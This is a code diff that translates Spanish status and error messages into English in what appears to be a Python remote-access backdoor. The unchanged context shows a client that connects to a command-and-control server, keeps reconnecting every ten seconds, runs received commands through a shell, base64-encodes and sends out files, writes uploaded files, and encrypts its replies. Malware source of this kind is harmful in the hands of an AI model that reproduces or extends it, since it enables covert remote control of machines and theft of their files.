@@ -54,7 +54,7 @@ def download_file(file):
             encoded = base64.b64encode(content).decode("utf-8")
             response = f"[download]" + f" {encoded} " + file
     else:
-        response = f"[!] El archivo {file} no existe."
+        response = f"[!] The file {file} doesen't exists."
     return response
 
 def upload_file(content, file_name):
@@ -71,9 +71,9 @@ def execute_command(command):
         result = subprocess.run(command, shell=True, capture_output=True, text=True)
         return result.stdout.strip() if result.stdout.strip() else result.stderr.strip()
     except subprocess.CalledProcessError as e:
-        return f"Error ejecutando el comando: {e}"
+        return f"Error executing the command: {e}"
     except Exception as e:
-        return f"Error inesperado: {e}"
+        return f"Error: {e}"
 
 def connect_to_c2():
     while True:
@@ -114,7 +114,7 @@ def connect_to_c2():
                     output = execute_command(command)
 
                 if not output:
-                    output = "[Sin respuesta]"
+                    output = "[No response]"
 
                 encrypted_output = encrypt_message(output)
                 size = str(len(encrypted_output)).zfill(10).encode("utf-8")
@@ -122,7 +122,7 @@ def connect_to_c2():
 
 
         except Exception as e:
-            print(f"[!] Error de conexión: {e}, reintentando en 10s...")
+            print(f"[!] Conection error: {e}, retrying in 10s...")
             time.sleep(10)
 
 
